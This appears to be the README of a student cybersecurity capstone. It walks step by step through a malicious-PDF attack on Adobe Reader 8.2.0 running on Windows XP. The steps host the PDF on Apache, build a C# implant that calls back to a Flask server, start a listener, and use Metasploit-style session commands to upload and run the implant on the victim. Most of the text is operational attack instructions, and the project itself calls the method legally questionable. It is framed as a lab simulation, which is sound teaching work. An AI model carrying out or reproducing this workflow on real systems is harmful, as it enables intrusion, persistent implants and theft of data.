# CyberEffects_IPDIMG
CyberEffects Capstone - Intellectual Property Defense via Illegal Methods Group (IPDIMG)

This is a simulation of a legally questionable way of determining whether intellectual property was not properly deleted after employment termination. Our capstone utilizes a vulnerability in Adobe Reader ver. 8.2.0 where payloads can be embedded into a .pdf file, and executed once opened in the vulnerable PDF reader. With this initial

## Vulnerable Target

Windows XP OS with Adobe Reader ver. 8.2.0 installed

Link to the vulnerable Adobe Reader ver. 8.2.0 [here](http://www.oldversion.com/windows/acrobat-reader-8-2-0)

Free Windows XP .iso file [here](https://eprebys.faculty.ucdavis.edu/2020/04/08/installing-windows-xp-in-virtualbox-or-other-vm/#:~:text=The%20product%20key%20is%20now,Mac%20can%20be%20found%20here.)

## Setting up Apache2 server to host malicious PDF

1. Install apache2

2. Copy the index.html to the '/var/www/html' directory

3. Run 'sudo systemctl start apache2' to start the server

4. File can be downloaded at http://***(host network IP)***:80

          Use 'ip addr show' and locate the host network IP

## Setting up vsftpd for the Apache2 server file location

Follow the following videos in order

1. Set up vsftpd [here](https://youtu.be/1WVBC0KBOeE?list=PLeiTQKKRIIRqCkCFe-xL8ohp5Euh8Jxqd)

2. Securing FTP server [here](https://youtu.be/N7hwrPiji3c?list=PLeiTQKKRIIRqCkCFe-xL8ohp5Euh8Jxqd)

3. Upload to Apache2 server using FTP [here](https://youtu.be/Np_OUB4gvc4?list=PLeiTQKKRIIRqCkCFe-xL8ohp5Euh8Jxqd)

**Note** - This has been known to restrict usable ports on the device. Make sure to allow ports 80 and 8080 for the Apache2 PDF download site and Flask server. SSL and firewall has also been known to mess with the implant's ability to reconnect with the FTP server.

          sudo ufw allow 80/tcp
          
          sudo ufw allow 8080/tcp
          
          sudo service apache2 restart

## Setting up and running any of the shell scripts

          chmod +x <script name>

          ./<script name>

## General Steps

1. Begin by generating the malicious PDF and generate encrypted archive file by generating the exe of 'generate_malicious_pdf.sh'.
  
          chmod +x generate_malicious_pdf.sh
  
          ./generate_malicious_pdf.sh
          
2. Set IP for Flask server to the inet IP

          'ifconfig'
          
          Find IP address right after inet
          
          Add inet IP to the app.run(debug=True, host='0.0.0.0', port=8080)

2. Start flask server that is responsible for communicating with implants
          
          Make note of the IP and port that the flask server is running on so that the implants know where to communicate back to 
          
          Make changes to the 'srvip' variable in implant.cs with the srvip that the flask server uses

3. Build the implant.cs into an executable
          
          Use .Net 4.0 Windows device to build the executable
          
          csc implant.cs

4. Start listener by running the listener.sh script
  
          chmod +x listener.sh
          
          ./listener.sh

5. Download and open the malicious PDF on the target machine

6. Upload the upload_exe.rc file to the target machine via session
  
          sessions -i 1
  
          upload upload_exe.rc
  
7. Run the resource script in order to upload and run the executable
  
          resource upload_exe.rc
